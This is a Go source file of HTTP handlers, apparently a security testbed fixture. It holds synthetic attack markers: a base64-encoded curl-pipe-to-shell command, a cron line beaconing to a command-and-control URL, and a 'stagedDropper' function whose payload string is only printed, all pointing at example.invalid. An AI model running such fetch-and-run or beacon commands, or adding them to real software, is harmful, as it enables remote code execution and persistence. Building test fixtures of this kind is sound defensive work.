package handlers

import (
	"encoding/base64"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
)

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := r.URL.Query().Get("url")
	parsed, err := url.Parse(source)
	if err != nil || parsed.Scheme != "https" || parsed.Host != "tools.example.invalid" ||
		parsed.Path != "/reach-testbed-tool.bin" || parsed.RawQuery != "" ||
		parsed.Fragment != "" || parsed.User != nil || parsed.String() != source {
		http.Error(w, "invalid tool URL", http.StatusBadRequest)
		return
	}

	target := filepath.Join(os.TempDir(), "reach-testbed-tool.bin")
	if err := os.WriteFile(target, []byte("Reachable local tool fixture\n"), 0600); err != nil {
		log.Printf("stage local tool fixture failed request_id=%q error=%q", r.Header.Get("X-Request-ID"), err.Error())
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	_, _ = w.Write([]byte(target + "\n"))
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}
